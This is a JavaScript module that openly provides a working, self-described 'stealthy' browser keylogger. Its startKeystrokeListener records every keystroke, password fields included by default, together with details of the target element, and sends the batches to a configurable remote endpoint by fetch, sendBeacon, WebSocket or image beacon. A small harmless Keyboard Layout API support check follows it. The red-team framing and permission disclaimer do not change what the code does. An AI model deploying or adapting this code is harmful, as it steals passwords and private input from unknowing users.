/**
 * keylogger.js — Advanced Keystroke Listener & Keyboard API Audit
 *
 * This module provides:
 *   1. `startKeystrokeListener()` – a production‑grade, stealthy keylogger that
 *      captures all keystrokes on the page, including modifier keys, active
 *      element details, and optional exfiltration to a remote server. Designed
 *      for authorised red‑team engagements and security assessments.
 *
 *   2. Default export – a Pinpoint‑compatible `Keyboard_API_Audit` that audits
 *      navigator.keyboard support and the availability of the Keyboard Layout
 *      API (getLayoutMap).
 *
 * **Use only on systems you own or have explicit permission to test.**
 */

// ---------------------------------------------------------------------------
// 1. Keystroke Listener Engine
// ---------------------------------------------------------------------------

/**
 * Default configuration for the keylogger.
 */
const DEFAULT_OPTIONS = {
    // If true, ignore keystrokes from password fields to avoid capturing
    // credentials (may be required by engagement rules).
    skipPasswords: false,

    // A callback receiving each keystroke as an object.
    onKey: null,

    // If provided, an absolute URL where captured data is sent.
    exfilEndpoint: null,

    // Exfiltration method: 'fetch', 'beacon', or 'websocket'.
    exfilMethod: 'fetch',

    // Batch size: how many keystrokes to buffer before sending.
    batchSize: 20,

    // Flush interval in ms; if the buffer is non‑empty after this time,
    // it is sent regardless of batch size.
    flushInterval: 10000,

    // If true, log full key details (key, code, keyCode, modifiers, etc.).
    extendedLog: true,

    // If true, also capture target element info (tag, id, class, name, type).
    captureElementInfo: true,

    // Maximum buffer size before dropping (safety).
    maxBufferSize: 500,

    // Optional: a custom filter function that receives the event and target;
    // return false to skip logging.
    filter: null,
};

/**
 * Starts a global keystroke listener that captures all keydown events
 * on the page. The listener runs in the capturing phase to beat any
 * other event handlers.
 *
 * @param {Object}   [options={}]
 * @param {boolean}  [options.skipPasswords=false]
 * @param {Function} [options.onKey]            – called with keystroke object.
 * @param {string}   [options.exfilEndpoint]
 * @param {'fetch'|'beacon'|'websocket'} [options.exfilMethod='fetch']
 * @param {number}   [options.batchSize=20]
 * @param {number}   [options.flushInterval=10000]
 * @param {boolean}  [options.extendedLog=true]
 * @param {boolean}  [options.captureElementInfo=true]
 * @param {number}   [options.maxBufferSize=500]
 * @param {Function} [options.filter]           – custom filter (event, target) => boolean.
 * @returns {{ stop: Function, getBuffer: Function }}  stop() removes listener and flushes; getBuffer() returns current buffer.
 */
export function startKeystrokeListener(options = {}) {
    const config = { ...DEFAULT_OPTIONS, ...options };
    const {
        skipPasswords,
        onKey,
        exfilEndpoint,
        exfilMethod,
        batchSize,
        flushInterval,
        extendedLog,
        captureElementInfo,
        maxBufferSize,
        filter,
    } = config;

    // Buffer for pending keystrokes.
    let buffer = [];
    let stopRequested = false;
    let flushTimer = null;

    // ---- Exfiltration helpers ----
    async function sendBatch(data) {
        if (!exfilEndpoint || data.length === 0) return;
        const payload = JSON.stringify(data);

        switch (exfilMethod) {
            case 'beacon':
                try {
                    navigator.sendBeacon(exfilEndpoint, payload);
                } catch (_) { }
                // Also attempt image beacon as fallback
                {
                    const b64 = btoa(unescape(encodeURIComponent(payload))).replace(/=+$/, '');
                    new Image().src = `${exfilEndpoint}?d=${b64}`;
                }
                break;
            case 'websocket':
                try {
                    const ws = new WebSocket(exfilEndpoint);
                    ws.onopen = () => ws.send(payload);
                    setTimeout(() => ws.close(), 2000);
                } catch (_) { }
                break;
            case 'fetch':
            default:
                try {
                    fetch(exfilEndpoint, {
                        method: 'POST',
                        mode: 'no-cors',
                        headers: { 'Content-Type': 'application/json' },
                        body: payload,
                    });
                } catch (_) { }
                // image beacon fallback
                {
                    const b64 = btoa(unescape(encodeURIComponent(payload))).replace(/=+$/, '');
                    new Image().src = `${exfilEndpoint}?d=${b64}`;
                }
        }
    }

    function flushBuffer() {
        if (buffer.length === 0) return;
        const batch = buffer.splice(0);
        sendBatch(batch).catch(() => { });
    }

    function startFlushTimer() {
        if (flushTimer) clearTimeout(flushTimer);
        if (flushInterval > 0 && !stopRequested) {
            flushTimer = setTimeout(() => {
                flushBuffer();
                startFlushTimer();
            }, flushInterval);
        }
    }

    // ---- Core keydown handler ----
    function handleKeyDown(event) {
        // Check for stop
        if (stopRequested) {
            document.removeEventListener('keydown', handleKeyDown, true);
            return;
        }

        const target = event.target;

        // Apply optional custom filter
        if (filter && typeof filter === 'function') {
            if (!filter(event, target)) return;
        }

        // Skip password fields if configured
        if (skipPasswords && target.matches && target.matches('input[type="password"], input[autocomplete="current-password"]')) {
            return;
        }

        // Build keystroke entry
        const entry = {
            timestamp: Date.now(),
            key: event.key,
            code: event.code,
        };

        if (extendedLog) {
            entry.keyCode = event.keyCode;
            entry.which = event.which;
            entry.shiftKey = event.shiftKey;
            entry.ctrlKey = event.ctrlKey;
            entry.altKey = event.altKey;
            entry.metaKey = event.metaKey;
            entry.repeat = event.repeat;
            entry.isComposing = event.isComposing;
        }

        if (captureElementInfo && target) {
            entry.target = {
                tagName: target.tagName,
                id: target.id || null,
                className: (target.className && typeof target.className === 'string') ? target.className : null,
                name: target.getAttribute('name') || null,
                type: target.getAttribute('type') || null,
                placeholder: target.getAttribute('placeholder') || null,
                autocomplete: target.getAttribute('autocomplete') || null,
            };
        }

        // Invoke callback
        if (onKey) {
            try { onKey(entry); } catch (_) { }
        }

        // Add to buffer
        if (exfilEndpoint) {
            if (buffer.length >= maxBufferSize) {
                // Buffer full, drop oldest half to avoid memory blowout
                buffer = buffer.slice(Math.floor(maxBufferSize / 2));
            }
            buffer.push(entry);

            // Auto‑flush if batch size reached
            if (buffer.length >= batchSize) {
                flushBuffer();
                // Restart timer after flush
                if (flushTimer) clearTimeout(flushTimer);
                startFlushTimer();
            }
        }
    }

    // Attach listener in capturing phase
    document.addEventListener('keydown', handleKeyDown, true);

    // Start flush timer if exfiltration is enabled
    if (exfilEndpoint) {
        startFlushTimer();
    }

    // Return controller object
    return {
        /**
         * Stop the keylogger, flush any remaining buffer, and clean up.
         */
        stop() {
            stopRequested = true;
            document.removeEventListener('keydown', handleKeyDown, true);
            if (flushTimer) clearTimeout(flushTimer);
            // Flush remaining data
            if (exfilEndpoint) {
                flushBuffer();
            }
        },
        /**
         * Returns a copy of the current keystroke buffer (without flushing).
         * Useful for local inspection.
         */
        getBuffer() {
            return [...buffer];
        },
    };
}

// ---------------------------------------------------------------------------
// 2. Pinpoint Keyboard_API_Audit (default export)
// ---------------------------------------------------------------------------

const pinpointModule = {
    id: 'keylogger',
    title: 'Keyboard_API_Audit',
    level: 5,
    info: 'Audits navigator.keyboard support and KeyboardMap layout API availability.',
    steps: [
        'Check navigator.keyboard support.',
        'Query keyboard layout map availability.',
    ],
    run: async () => {
        const supported =
            navigator.keyboard && typeof navigator.keyboard.getLayoutMap === 'function';
        return {
            keyboardLayoutApiSupported: supported,
            message: supported
                ? 'Keyboard Layout API is supported by this browser.'
                : 'Keyboard Layout API is not supported.',
        };
    },
};

export default pinpointModule;